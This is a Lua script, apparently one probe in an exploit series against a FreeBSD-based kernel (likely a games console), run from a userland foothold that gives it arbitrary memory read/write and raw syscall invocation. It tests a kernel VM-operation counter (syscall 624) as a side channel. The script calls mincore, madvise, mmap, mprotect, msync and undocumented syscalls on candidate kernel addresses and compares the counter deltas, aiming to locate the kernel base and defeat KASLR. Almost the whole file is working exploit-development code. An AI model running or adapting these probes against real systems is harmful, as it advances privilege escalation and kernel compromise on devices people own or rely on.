-- CRASH_CLASS: LOW
-- PROBE 56f: sys 624 VM op counter as KASLR side channel
--
-- 624 counts kernel VM operations: +5 per mmap, zero jitter (52b).
-- Hypothesis: some syscalls with address arguments may perform
-- different numbers of VM ops depending on whether the address
-- falls in a mapped kernel region. If the delta varies by address,
-- we can binary search for the kernel base.
--
-- Test: call syscalls with different address arguments, measure
-- 624 delta for each. Compare kernel VA guesses vs known-bad addresses.

print("=== PROBE 56f: 624 SIDE CHANNEL ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end

local sc624 = mk(624)
local function vm_ops()
    local r = sc624(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0))
    return N(r)
end

local base = vm_ops()
print(string.format("baseline 624=%d", base))

-- ============ SECTION A: mincore(78) with various addresses ============
-- mincore(addr, len, vec_out) — queries page residency
-- On FreeBSD, it walks the VM map for the address range.
-- If a kernel address triggers a different code path than unmapped userland,
-- the VM op count may differ.
print("")
print("--- SECTION A: mincore(78) VM op delta ---")

local sc_mincore = mk(78)
local vec = memory.alloc(256)

local test_addrs = {
    {name = "userland_heap",   hi = 0x00000003, lo = 0x10000000},
    {name = "userland_high",   hi = 0x0000000F, lo = 0xE0000000},
    {name = "unmapped_user",   hi = 0x00000001, lo = 0x00000000},
    {name = "kernel_low",      hi = 0xFFFF8000, lo = 0x00000000},
    {name = "kernel_mid",      hi = 0xFFFF8001, lo = 0x00000000},
    {name = "kernel_high",     hi = 0xFFFF8100, lo = 0x00000000},
    {name = "kernel_sled1",    hi = 0xFFFF8200, lo = 0x00000000},
    {name = "kernel_sled2",    hi = 0xFFFF8400, lo = 0x00000000},
    {name = "kernel_sled3",    hi = 0xFFFF8800, lo = 0x00000000},
    {name = "kernel_typical",  hi = 0xFFFFF800, lo = 0x00000000},
    {name = "kernel_near_top", hi = 0xFFFFFF00, lo = 0x00000000},
}

for _, t in ipairs(test_addrs) do
    local addr = uint64(string.format("0x%08X%08X", t.hi, t.lo))
    local before = vm_ops()
    local ok, ret = pcall(function()
        return sc_mincore(addr, uint64(0x4000), uint64(N(vec)))
    end)
    local after = vm_ops()
    local rv = ok and N(ret) or -999
    print(string.format("  %-18s 0x%08X%08X: ret=%d delta=%d",
        t.name, t.hi, t.lo, rv, after - before))
end

-- ============ SECTION B: madvise(75) VM op delta ============
print("")
print("--- SECTION B: madvise(75) VM op delta ---")

local sc_madvise = mk(75)

for _, t in ipairs(test_addrs) do
    local addr = uint64(string.format("0x%08X%08X", t.hi, t.lo))
    local before = vm_ops()
    local ok, ret = pcall(function()
        return sc_madvise(addr, uint64(0x4000), uint64(0))
    end)
    local after = vm_ops()
    local rv = ok and N(ret) or -999
    print(string.format("  %-18s 0x%08X%08X: ret=%d delta=%d",
        t.name, t.hi, t.lo, rv, after - before))
end

-- ============ SECTION C: sys 547 query_memory_protection ============
print("")
print("--- SECTION C: sys 547 VM op delta ---")

local sc547 = mk(547)
local outbuf = memory.alloc(256)

for _, t in ipairs(test_addrs) do
    local addr = uint64(string.format("0x%08X%08X", t.hi, t.lo))
    for i = 0, 63, 4 do wd(N(outbuf) + i, 0) end
    local before = vm_ops()
    local ok, ret = pcall(function()
        return sc547(addr, uint64(N(outbuf)), uint64(64))
    end)
    local after = vm_ops()
    local rv = ok and N(ret) or -999
    print(string.format("  %-18s 0x%08X%08X: ret=%d delta=%d",
        t.name, t.hi, t.lo, rv, after - before))
end

-- ============ SECTION D: sys 674 VM map query ============
print("")
print("--- SECTION D: sys 674 VM op delta ---")

local sc674 = mk(674)
local rec = memory.alloc(256)

for _, t in ipairs(test_addrs) do
    local addr = uint64(string.format("0x%08X%08X", t.hi, t.lo))
    for i = 0, 71, 4 do wd(N(rec) + i, 0) end
    local before = vm_ops()
    local ok, ret = pcall(function()
        return sc674(addr, uint64(0), uint64(N(rec)), uint64(72))
    end)
    local after = vm_ops()
    local rv = ok and N(ret) or -999
    print(string.format("  %-18s 0x%08X%08X: ret=%d delta=%d",
        t.name, t.hi, t.lo, rv, after - before))
end

-- ============ SECTION E: mmap at kernel addresses ============
-- What happens if we try to mmap with a hint in kernel space?
print("")
print("--- SECTION E: mmap(477) with kernel hint, VM op delta ---")

local sc_mmap = mk(477)

for _, t in ipairs(test_addrs) do
    if t.hi >= 0xFFFF8000 then
        local addr = uint64(string.format("0x%08X%08X", t.hi, t.lo))
        local before = vm_ops()
        local ok, ret = pcall(function()
            return sc_mmap(addr, uint64(0x4000), uint64(3), uint64(0x1002),
                uint64(0xFFFFFFFF), uint64(0))
        end)
        local after = vm_ops()
        local ret_hi, ret_lo = 0, 0
        if ok and ret then ret_hi, ret_lo = get_hi_lo(ret) end
        local rv_str = ok and string.format("0x%08X%08X", ret_hi, ret_lo) or "FAIL"
        print(string.format("  %-18s hint=0x%08X%08X: ret=%s delta=%d",
            t.name, t.hi, t.lo, rv_str, after - before))
    end
end

-- ============ SECTION F: mprotect on kernel addresses ============
print("")
print("--- SECTION F: mprotect(74) on kernel addrs, VM op delta ---")

local sc_mprot = mk(74)

for _, t in ipairs(test_addrs) do
    if t.hi >= 0xFFFF8000 then
        local addr = uint64(string.format("0x%08X%08X", t.hi, t.lo))
        local before = vm_ops()
        local ok, ret = pcall(function()
            return sc_mprot(addr, uint64(0x4000), uint64(1))
        end)
        local after = vm_ops()
        local rv = ok and N(ret) or -999
        print(string.format("  %-18s 0x%08X%08X: ret=%d delta=%d",
            t.name, t.hi, t.lo, rv, after - before))
    end
end

-- ============ SECTION G: msync(65) on kernel addresses ============
print("")
print("--- SECTION G: msync(65) on kernel addrs, VM op delta ---")

local sc_msync = mk(65)

for _, t in ipairs(test_addrs) do
    if t.hi >= 0xFFFF8000 then
        local addr = uint64(string.format("0x%08X%08X", t.hi, t.lo))
        local before = vm_ops()
        local ok, ret = pcall(function()
            return sc_msync(addr, uint64(0x4000), uint64(2))
        end)
        local after = vm_ops()
        local rv = ok and N(ret) or -999
        print(string.format("  %-18s 0x%08X%08X: ret=%d delta=%d",
            t.name, t.hi, t.lo, rv, after - before))
    end
end

-- ============ SECTION H: Repeated measurements for any non-zero deltas ============
-- Run the most interesting syscall 10x on two addresses to confirm stability
print("")
print("--- SECTION H: Stability check (mincore x10 on two addresses) ---")

local addr_user = uint64(string.format("0x%08X%08X", 0x00000001, 0x00000000))
local addr_kern = uint64(string.format("0x%08X%08X", 0xFFFFF800, 0x00000000))

local user_deltas = {}
local kern_deltas = {}

for i = 1, 10 do
    local before = vm_ops()
    pcall(function() sc_mincore(addr_user, uint64(0x4000), uint64(N(vec))) end)
    local after = vm_ops()
    user_deltas[i] = after - before
end

for i = 1, 10 do
    local before = vm_ops()
    pcall(function() sc_mincore(addr_kern, uint64(0x4000), uint64(N(vec))) end)
    local after = vm_ops()
    kern_deltas[i] = after - before
end

local function tbl_str(t)
    local s = {}
    for i, v in ipairs(t) do s[i] = tostring(v) end
    return table.concat(s, ",")
end

print(string.format("  user (0x100000000) x10: [%s]", tbl_str(user_deltas)))
print(string.format("  kern (0xFFFFF80000000000) x10: [%s]", tbl_str(kern_deltas)))

-- ============ DONE ============
print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 56f COMPLETE ===")
